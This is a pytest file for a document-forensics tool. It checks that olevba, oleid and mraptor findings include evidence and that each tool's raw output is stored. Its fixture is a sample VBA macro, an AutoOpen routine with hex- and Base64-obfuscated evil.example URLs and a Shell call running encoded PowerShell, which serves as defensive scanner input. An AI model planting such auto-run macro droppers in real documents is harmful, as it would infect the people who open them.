"""olevba/oleid/mraptor findings carry evidence and each tool keeps its raw output."""

from __future__ import annotations

from pathlib import Path

import pytest

pytest.importorskip("oletools")

from docutracex.parsers import oletools_suite  # noqa: E402

SAMPLES = Path(__file__).resolve().parent.parent / "samples"

VBA = '''Sub AutoOpen()
x = "68747470733a2f2f6576696c2e6578616d706c652f61"
y = "aHR0cHM6Ly9ldmlsLmV4YW1wbGUvYg=="
Shell "cmd.exe /c powershell -enc " & y
End Sub'''


class _FakeParser:
    """VBA_Parser stand-in returning real VBA (the samples carry none); the
    analysis itself is olevba's real scanner."""

    def __init__(self, _path):
        pass

    def detect_vba_macros(self):
        return True

    def extract_macros(self):
        yield ("f", "VBA/Module1", "Module1.bas", VBA)

    def analyze_macros(self, *a, **k):
        from oletools.olevba import VBA_Scanner
        return VBA_Scanner(VBA).scan()

    def close(self):
        pass


@pytest.mark.skipif(not (SAMPLES / "sample.docm").exists(), reason="samples not generated")
def test_findings_have_evidence_and_tools_keep_output(tmp_path: Path, monkeypatch) -> None:
    import oletools.olevba
    monkeypatch.setattr(oletools.olevba, "VBA_Parser", _FakeParser)
    res = oletools_suite.analyze(SAMPLES / "sample.docm", tmp_path / "extracted")
    by_kw = {f["detail"].split(":")[0]: f for f in res["findings"] if f["tool"] == "olevba"}

    # Hex/Base64 strings: the encoded value and what it decodes to.
    assert "https://evil.example/a" in by_kw["Hex Strings"]["evidence"]
    assert "aHR0cHM6Ly9ldmlsLmV4YW1wbGUvYg== → https://evil.example/b" in by_kw["Base64 Strings"]["evidence"]
    # Keywords: the VBA line where olevba saw them.
    assert by_kw["Shell"]["evidence"].startswith("Module1.bas line 4: Shell")
    assert "Module1.bas line 1" in by_kw["AutoOpen"]["evidence"]
    # IOC only visible after decoding: the decoded string is shown.
    url = next(f for f in res["findings"] if f["detail"].startswith("https://evil.example/a: URL"))
    assert "decoded: https://evil.example/a" in url["evidence"]

    mr = [f for f in res["findings"] if f["tool"] == "mraptor"]
    assert mr and "line" in mr[0]["evidence"]

    tools = res["tools"]
    assert tools["olevba"]["analysis"] and tools["olevba"]["decoded_strings"]["hex"]
    for name in ("olevba", "oleid", "mraptor", "msodde", "oleobj"):
        assert tools[name].get("output"), name           # raw tool output stored
        assert tools[name].get("command"), name
    assert "olevba" in tools["olevba"]["output"]
    assert any(i.get("description") for i in tools["oleid"]["indicators"])
